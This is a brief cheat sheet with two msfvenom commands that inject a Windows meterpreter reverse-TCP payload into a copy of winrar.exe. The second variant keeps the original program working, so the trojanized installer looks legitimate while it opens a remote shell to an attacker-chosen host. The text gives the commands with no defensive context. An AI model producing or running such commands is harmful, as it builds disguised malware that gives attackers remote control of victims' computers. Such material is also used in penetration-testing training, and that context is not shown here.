<=== Payload Injection ===>

## Inject into winrar.exe
```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<L_IP> LPORT=1234 -i 10 -x /home/winrar.exe -f exe > /home/user/Desktop/win_en.exe
```
---
## Inject into winrar.exe and Keep Original Functionality
```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<L_IP> LPORT=1234 -i 10 -k -x /home/winrar.exe -f exe > /home/user/Desktop/win_en.exe
```
